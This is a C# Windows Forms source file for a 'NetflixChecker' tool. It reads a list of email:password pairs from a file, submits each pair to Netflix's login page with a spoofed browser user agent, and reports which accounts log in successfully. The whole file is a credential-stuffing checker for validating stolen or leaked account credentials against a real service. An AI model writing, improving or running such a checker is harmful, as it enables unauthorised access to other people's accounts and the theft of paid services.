using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net;


namespace NetflixChecker
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void scanner_Click(object sender, EventArgs e)
        {
            int accounts = textBox1.Lines.Length;
            string url = "https://www.netflix.com/Login";
            for (int i = 0; i != accounts; i++)
            {
                foreach (string st in textBox1.Lines)
                {
                    if (string.IsNullOrEmpty(st))
                    {
                        continue;
                    }
                    int location = st.IndexOf(':');
                    string username = st.Substring(0,location);
                    string password = st.Substring(location,st.Length-(location));
                    password = password.Replace(':',' ');
                    password.Trim();
                    login(username,password);
                }
                
            }
        }

        private void adder_Click(object sender, EventArgs e)
        {
            string path = string.Empty;
            string[] accounts;
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.ShowDialog();
            path = ofd.FileName;
            accounts = File.ReadAllLines(path);
            textBox1.Text = string.Empty;
            foreach (string account in accounts)
            {
                textBox1.Text += "\n" + account;
            }
            adder.Enabled = false;
        }
        private void login(string username, string password)
        {
            try
            {
                CookieCollection cookies = new CookieCollection();
                HttpWebRequest request =
                    (HttpWebRequest)WebRequest.Create("https://www.netflix.com/login");
                request.CookieContainer = new CookieContainer();
                request.CookieContainer.Add(cookies);
                //Get the response from the server and save the cookies from the first request..
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                cookies = response.Cookies;


                string formparams = string.Format("email={0}&password={1}",
                                                   username, password);

                //Create a request using a URL that can recieve a post
                HttpWebRequest webreq =
                    (HttpWebRequest)WebRequest.Create("https://www.netflix.com/login");
                webreq.CookieContainer = new CookieContainer();
                webreq.CookieContainer.Add(cookies);
                //Set a method property of the request to POST
                webreq.Method = "POST";
                webreq.Referer = "https://www.netflix.com/login";
                webreq.ContentType = "application/x-www-form-urlencoded";
                webreq.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2";


                //Create a POST data and convert it to a byte array
                byte[] bytes = Encoding.ASCII.GetBytes(formparams);

                webreq.ContentLength = bytes.Length;

                //write
                Stream postdata = webreq.GetRequestStream(); //open connection
                postdata.Write(bytes, 0, bytes.Length); //send the data
                postdata.Close();


                WebResponse resp = webreq.GetResponse();
                Stream answer = resp.GetResponseStream();


                StreamReader _answer = new
                      StreamReader(webreq.GetResponse().GetResponseStream());

                string reply = _answer.ReadToEnd();

                textBox2.Text = reply;

                if (reply.Contains("Restart Your Membership"))
                {
                    MessageBox.Show("working");
                }
                else
                {
                    MessageBox.Show("not Working");
                }
                textBox2.Clear();
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message);
            }
        }
    }
}
